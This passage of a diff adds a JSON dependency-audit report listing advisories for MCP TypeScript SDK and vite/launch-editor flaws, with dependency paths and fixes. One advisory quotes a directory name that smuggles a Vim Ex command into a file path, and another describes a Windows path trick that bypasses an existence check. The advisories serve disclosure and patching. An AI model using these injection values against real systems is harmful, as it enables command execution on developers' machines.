+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-6prh-2h8m-c8cw\n- https://github.com/modelcontextprotocol/typescript-sdk/pull/2901\n- https://github.com/modelcontextprotocol/typescript-sdk/pull/2902\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0\n- https://github.com/advisories/GHSA-6prh-2h8m-c8cw",
+      "created": "2026-10-20T18:26:30.000Z",
+      "id": 1242630,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nIn affected versions, the SDK's HTTP client transports and OAuth requests followed redirects to any origin.\n\nIf an MCP server or authorization server redirected a request to another origin, that origin received custom request headers (such as an `X-API-Key` set in `requestInit.headers`) and the `mcp-session-id` header. On a `307` or `308` it also received the request body, including OAuth token requests with their `refresh_token` and `client_secret`.\n\nOn current runtimes `fetch` already drops the `Authorization` header across origins.\n\n### Am I affected?\nYes, if your application uses `StreamableHTTPClientTransport`, `SSEClientTransport`, or the SDK's OAuth client functions such as `auth()`. stdio clients are not affected.\n\nAffected versions:\n\n- `@modelcontextprotocol/sdk` all versions through 1.31.0\n- `@modelcontextprotocol/client` 2.0.0 through 2.2.0\n\n### Fix\nUpgrade to:\n\n- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later\n- 2.x: `@modelcontextprotocol/client` 2.3.0 or later\n\nRedirects are now followed only within the same origin, and not at all in browsers. If your MCP server or authorization server redirects to another origin on purpose, configure the final URL instead. Setting `redirectPolicy: 'follow'` on a transport restores the old behaviour and the exposure.\n\nIf a redirect may have reached a host you do not control, rotate the API keys and `client_secret` your application held and revoke its tokens.\n\nIf you cannot upgrade yet, pass a `fetch` that refuses redirects, for example `(url, init) => fetch(url, { ...init, redirect: 'error' })`.",
+      "reported_by": null,
+      "title": "MCP TypeScript client SDK: HTTP client transports and OAuth requests followed cross-origin redirects and re-sent custom headers and request bodies",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111769"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": "<1.32.0",
+      "github_advisory_id": "GHSA-6prh-2h8m-c8cw",
+      "recommendation": "Upgrade to version 1.32.0 or later",
+      "patched_versions": ">=1.32.0",
+      "updated": "2026-10-20T18:26:32.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-6prh-2h8m-c8cw"
+    },
+    "1242649": {
+      "findings": [
+        {
+          "version": "1.31.0",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-46jr-4wx8-v453\n- https://github.com/modelcontextprotocol/typescript-sdk/pull/2926\n- https://github.com/modelcontextprotocol/typescript-sdk/pull/2927\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/fd26801b3b387742fe24a90ed4b275dd6072209f\n- https://github.com/advisories/GHSA-46jr-4wx8-v453",
+      "created": "2026-10-20T20:06:35.000Z",
+      "id": 1242649,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nIn affected versions, servers put no limit on how many array elements and object keys they validated in one request. One HTTP request within the default 4 MiB size limit could exhaust the server's memory, and the process aborted with `JavaScript heap out of memory`.\n\nNo credentials are needed, unless you authenticate requests before they reach the SDK.\n\n### Am I affected?\nYes, if clients you do not fully trust can reach your server over HTTP. The risk is highest for `McpServer` tools whose input contains an array or a record. stdio-only servers are not affected.\n\nAffected versions:\n\n- `@modelcontextprotocol/sdk` 1.3.0 through 1.31.0\n- `@modelcontextprotocol/server` 2.0.0 through 2.2.0\n\n### Fix\nUpgrade to:\n\n- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later\n- 2.x: `@modelcontextprotocol/server` 2.3.0 or later\n\n**Upgrading alone changes nothing.** The patched versions add an `McpServer` option, `maxToolInputElements`, that is off by default. Make both of these changes:\n\n1. Set `maxToolInputElements` just above the largest input your tools need, for example `new McpServer(info, { maxToolInputElements: 10_000 })`. It counts array elements and object keys in a call's arguments. A call over the limit gets an `isError: true` result.\n2. Lower the request size limit to what your tools need. The option covers tool arguments only, and the size limit covers everything else. Set `maxRequestBodySize` on the transport or `createMcpHandler()`. If you parse the body yourself, for example with `express.json()` or Fastify, set that parser's limit.\n\nIf you cannot upgrade yet, make the second change. `maxRequestBodySize` needs `@modelcontextprotocol/sdk` 1.30.1 or `@modelcontextprotocol/server` 2.1.0. Below that, use a reverse proxy.",
+      "reported_by": null,
+      "title": "MCP TypeScript SDK: One HTTP request within the default size limit could exhaust server memory during validation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111768"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": ">=1.3.0 <1.32.0",
+      "github_advisory_id": "GHSA-46jr-4wx8-v453",
+      "recommendation": "Upgrade to version 1.32.0 or later",
+      "patched_versions": ">=1.32.0",
+      "updated": "2026-10-20T20:06:38.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-46jr-4wx8-v453"
+    },
+    "1242654": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112944\n- https://github.com/vitejs/launch-editor/pull/156\n- https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-r825-w8mm-5pxw",
+      "created": "2026-10-20T19:51:52.000Z",
+      "id": 1242654,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\n\n### Impact\n\n#### Direct `launch-editor` users\n\nOnly apps that match all of the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\n\n#### `launch-editor-middleware` users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- launch-editor older than v2.2.0 is used, or the user is using WSL\n\n#### Vite users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The user is using WSL\n\n### Details\n\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\n```\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\n```\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\n\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\n- Vim (including gVim)\n- MacVim\n- Emacs (including Emacsclient)\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\n\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.",
+      "reported_by": null,
+      "title": "launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112944"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-r825-w8mm-5pxw",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-20T19:51:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-88"
+      ],
+      "url": "https://github.com/advisories/GHSA-r825-w8mm-5pxw"
+    },
+    "1242661": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-587h-7wmj-h5pm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112942\n- https://github.com/vitejs/launch-editor/commit/f13cd835d4b8e860b1d4d080ad8a490cc2463679\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-587h-7wmj-h5pm",
+      "created": "2026-10-20T19:48:25.000Z",
+      "id": 1242661,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` checked `fs.existsSync(fileName)` before passing a supplied path to an editor command. On Windows, an attacker can bypass this check with a crafted path ending in `\\\\..:line:column`. This removes the requirement that the attacker be able to place a file with a malicious filename.\n\nCombined with the `%` escaping issue described in [GHSA-698v-4r3x-3vcv](https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv), this bypass can lead to OS command injection when an attacker controls the file argument.\n\n### Impact\n\nOnly apps that runs on Windows is affected.\n\n### Details\n\nThe earlier advisory assumed that `fs.existsSync()` required an attacker-controlled filename to exist. This advisory covers a bypass of that requirement.\n\nA crafted value ending in `\\\\..:1:1` is interpreted differently by `launch-editor-middleware`, `launch-editor`, and Windows:\n\n1. `launch-editor-middleware` calls `path.resolve()` while the final path component is `..:1:1`, so it is not treated as a parent-directory component.\n2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes it, leaving a path ending in `\\\\..`.\n3. On Windows, `fs.existsSync()` accepts the resulting path as the existing parent directory even though the attacker-controlled preceding component does not exist.\n4. Because the existence check passes, the crafted filename reaches the Windows shell command.",
+      "reported_by": null,
+      "title": "launch-editor: `fs.existsSync()` existence check can be bypassed on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112942"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-587h-7wmj-h5pm",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-20T19:48:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-77"
+      ],
+      "url": "https://github.com/advisories/GHSA-587h-7wmj-h5pm"
+    },
+    "1242667": {
+      "findings": [
+        {
+          "version": "1.31.0",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-rvq5-wwqv-78pq\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/5a0724d14cf34a27a3b070224d2996cdd611df9f\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/5a1867390b91b8836f49af76c45427279f513325\n- https://github.com/advisories/GHSA-rvq5-wwqv-78pq",
+      "created": "2026-10-20T19:43:36.000Z",
+      "id": 1242667,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nIn affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.\n\n### Am I affected?\nYes, if your HTTP server uses `requireBearerAuth()` or `verifyBearerToken()`, its authorization server also issues tokens for other services, and your `verifyAccessToken()` does not check the token's audience (`aud`) itself.\n\nAffected versions:\n\n- `@modelcontextprotocol/sdk` 1.6.0 through 1.31.0\n- `@modelcontextprotocol/server` 2.0.0 through 2.2.0\n- `@modelcontextprotocol/express` 2.0.0 through 2.0.1\n- `@modelcontextprotocol/server-legacy` 2.0.0 through 2.3.0\n\n### Fix\nUpgrade to:\n\n- 1.x: `@modelcontextprotocol/sdk` 1.32.0 or later\n- 2.x: `@modelcontextprotocol/server` 2.3.0 or later, together with `@modelcontextprotocol/express` 2.0.2 or later if you use it\n- `@modelcontextprotocol/server-legacy` 2.3.1 or later\n\n**Upgrading alone changes nothing.** The patched versions add an `expectedResource` setting that is off by default. To turn the check on, make both of these changes together:\n\n1. Pass the audience your authorization server puts in tokens for your server: `requireBearerAuth({ verifier, expectedResource: new URL('https://mcp.example.com/mcp') })`.\n2. Return the token's audience from `verifyAccessToken()` as `AuthInfo.resource`, also a `URL`.\n\nA token for another service then gets `401`. With only the first change, every request gets `401`.\n\nIf you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verifyAccessToken()`. That closes the issue on every version.",
+      "reported_by": null,
+      "title": "MCP TypeScript SDK: Server bearer authentication accepted tokens issued for another service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111771"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": ">=1.6.0 <1.32.0",
+      "github_advisory_id": "GHSA-rvq5-wwqv-78pq",
+      "recommendation": "Upgrade to version 1.32.0 or later",
+      "patched_versions": ">=1.32.0",
+      "updated": "2026-10-20T19:43:37.000Z",
+      "cvss": {
+        "score": 6.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-rvq5-wwqv-78pq"
+    },
+    "1242727": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112945\n- https://github.com/vitejs/vite/pull/23653\n- https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17\n- https://github.com/advisories/GHSA-9jrq-w75r-8gcw",
+      "created": "2026-10-21T16:48:14.000Z",
+      "id": 1242727,
+      "npm_advisory_id": null,
